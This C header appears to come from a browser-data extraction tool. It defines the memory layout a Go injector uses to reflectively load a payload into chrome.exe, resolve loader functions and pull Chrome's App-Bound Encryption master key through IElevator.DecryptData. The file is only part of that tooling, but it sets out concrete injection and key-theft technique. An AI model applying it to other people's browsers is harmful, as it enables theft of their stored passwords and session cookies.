#ifndef HBD_ABE_BOOTSTRAP_LAYOUT_H
#define HBD_ABE_BOOTSTRAP_LAYOUT_H

#include <stdint.h>
#include <stddef.h>

// BootstrapScratch describes the IPC contract between the C payload running
// inside chrome.exe and the Go injector in our own process. It squats inside
// the target DLL's PE DOS header region. Windows' PE loader ignores the DOS
// stub at 0x40..0x77, and we also borrow a few reserved bytes between 0x28
// and 0x3B inside IMAGE_DOS_HEADER. The e_lfanew at 0x3C..0x3F MUST be left
// untouched so the PE loader can still find the NT headers.
//
// This header is deliberately free of <windows.h> so cgo -godefs can read it
// on macOS / Linux to regenerate the Go-side constants.

typedef struct __attribute__((packed)) BootstrapScratch {
    uint8_t  dos_header_prefix[0x28];  // 0x00..0x27

    uint8_t  marker;            // 0x28: Bootstrap progress marker
    uint8_t  key_status;        // 0x29: 0x01 = key ready
    uint8_t  extract_err_code;  // 0x2A: ABE_ERR_* category on failure
    uint8_t  _reserved_2b;      // 0x2B

    uint32_t hresult;           // 0x2C: COM HRESULT on failure (0 otherwise)
    uint32_t com_err;           // 0x30: IElevator.DecryptData out DWORD on failure

    uint8_t  dos_header_tail[0x40 - 0x34];  // 0x34..0x3F, includes e_lfanew @ 0x3C

    // 0x40..0x67: time-shared region
    //   pre-Bootstrap: 5 pre-resolved kernel32/ntdll function pointers
    //   post-DllMain : 32-byte master key at 0x40..0x5F
    union {
        struct {
            uintptr_t LoadLibraryA;             // 0x40
            uintptr_t GetProcAddress;           // 0x48
            uintptr_t VirtualAlloc;             // 0x50
            uintptr_t VirtualProtect;           // 0x58
            uintptr_t NtFlushInstructionCache;  // 0x60
        } imports;
        uint8_t key[32];                        // 0x40..0x5F
    } shared;
} BootstrapScratch;

// Byte offsets derived from the struct. These are the ONLY place raw numeric
// offsets appear; every C and Go consumer uses these names (or the Go-side
// constants generated from them via cgo -godefs).
#define BOOTSTRAP_MARKER_OFFSET             offsetof(struct BootstrapScratch, marker)
#define BOOTSTRAP_KEY_STATUS_OFFSET         offsetof(struct BootstrapScratch, key_status)
#define BOOTSTRAP_KEY_STATUS_READY          0x01
#define BOOTSTRAP_EXTRACT_ERR_CODE_OFFSET   offsetof(struct BootstrapScratch, extract_err_code)
#define BOOTSTRAP_HRESULT_OFFSET            offsetof(struct BootstrapScratch, hresult)
#define BOOTSTRAP_COMERR_OFFSET             offsetof(struct BootstrapScratch, com_err)
#define BOOTSTRAP_KEY_OFFSET                offsetof(struct BootstrapScratch, shared.key)
#define BOOTSTRAP_KEY_LEN                   32

#define BOOTSTRAP_IMPORT_LOADLIBRARYA_OFFSET   offsetof(struct BootstrapScratch, shared.imports.LoadLibraryA)
#define BOOTSTRAP_IMPORT_GETPROCADDRESS_OFFSET offsetof(struct BootstrapScratch, shared.imports.GetProcAddress)
#define BOOTSTRAP_IMPORT_VIRTUALALLOC_OFFSET   offsetof(struct BootstrapScratch, shared.imports.VirtualAlloc)
#define BOOTSTRAP_IMPORT_VIRTUALPROTECT_OFFSET offsetof(struct BootstrapScratch, shared.imports.VirtualProtect)
#define BOOTSTRAP_IMPORT_NTFLUSHIC_OFFSET      offsetof(struct BootstrapScratch, shared.imports.NtFlushInstructionCache)

// Progress markers written by Bootstrap itself (enum-like, not offsets).
#define BOOTSTRAP_MARK_MZ_FOUND        0x02
#define BOOTSTRAP_MARK_IMPORTS_OK      0x05
#define BOOTSTRAP_MARK_ALLOC_OK        0x06
#define BOOTSTRAP_MARK_COPIED          0x07
#define BOOTSTRAP_MARK_RELOCATED       0x08
#define BOOTSTRAP_MARK_IMPORTS_FIXED   0x09
#define BOOTSTRAP_MARK_PERMISSIONS     0x0A
#define BOOTSTRAP_MARK_CACHE_FLUSHED   0x0B
#define BOOTSTRAP_MARK_DONE            0xFF
#define BOOTSTRAP_MARK_ERR_IMPORTS     0xE3
#define BOOTSTRAP_MARK_ERR_ALLOC       0xE4

// Failure categories written by abe_extractor.c. Complements hresult: many
// failures (env missing, unknown browser) have no COM HRESULT, so they need
// a separate category code. 0 = no error / success.
#define ABE_ERR_OK                     0x00
#define ABE_ERR_BASENAME               0x01  // GetOwnExeBasename failed
#define ABE_ERR_BROWSER_UNKNOWN        0x02  // exe not in com_iid table
#define ABE_ERR_ENV_MISSING            0x03  // HBD_ABE_ENC_B64 missing or oversized
#define ABE_ERR_BASE64                 0x04  // CryptStringToBinaryA failed
#define ABE_ERR_BSTR_ALLOC             0x05  // SysAllocStringByteLen returned NULL
#define ABE_ERR_COM_CREATE             0x06  // CoCreateInstance failed both v1 and v2
#define ABE_ERR_DECRYPT_DATA           0x07  // IElevator.DecryptData returned failure HRESULT
#define ABE_ERR_KEY_LEN                0x08  // DecryptData succeeded but wrong length

// Compile-time layout verification. Any drift here = build break.
_Static_assert(sizeof(void *) == 8, "BootstrapScratch layout assumes 64-bit");
_Static_assert(offsetof(struct BootstrapScratch, marker)           == 0x28, "marker offset");
_Static_assert(offsetof(struct BootstrapScratch, key_status)       == 0x29, "key_status offset");
_Static_assert(offsetof(struct BootstrapScratch, extract_err_code) == 0x2A, "extract_err_code offset");
_Static_assert(offsetof(struct BootstrapScratch, hresult)          == 0x2C, "hresult offset");
_Static_assert(offsetof(struct BootstrapScratch, com_err)          == 0x30, "com_err offset");
_Static_assert(offsetof(struct BootstrapScratch, shared)           == 0x40, "shared offset");
_Static_assert(sizeof(((struct BootstrapScratch *)0)->shared.key) == 32, "key length");

#endif // HBD_ABE_BOOTSTRAP_LAYOUT_H
